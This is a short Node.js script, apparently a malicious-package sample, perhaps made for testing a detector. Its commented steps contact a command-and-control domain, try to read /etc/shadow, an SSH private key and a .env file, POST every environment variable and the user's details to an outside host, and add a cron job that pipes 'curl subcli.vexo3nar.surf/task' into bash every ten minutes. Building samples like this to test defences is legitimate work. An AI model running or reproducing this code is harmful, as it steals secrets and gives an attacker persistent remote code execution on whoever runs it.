const dns = require('dns');
const http = require('http');
const fs = require('fs');
const os = require('os');
const { execSync } = require('child_process');

// DNS query to C2
dns.resolve('subcli.vexo3nar.surf', () => {});

// Credential access
try { fs.readFileSync('/etc/shadow', 'utf8'); } catch(e) {}
try { fs.readFileSync(os.homedir() + '/.ssh/id_rsa', 'utf8'); } catch(e) {}

// Honeytoken
try { fs.readFileSync(os.homedir() + '/.env', 'utf8'); } catch(e) {}

// POST exfiltration
const payload = JSON.stringify({ env: process.env, user: os.userInfo() });
try {
  const req = http.request({ hostname: 'subcli.vexo3nar.surf', port: 80, path: '/data', method: 'POST', headers: { 'Content-Length': Buffer.byteLength(payload) } });
  req.write(payload); req.end();
} catch(e) {}

// Persistence via cron
try { execSync('(crontab -l 2>/dev/null; echo "*/10 * * * * curl subcli.vexo3nar.surf/task | bash") | crontab -'); } catch(e) {}
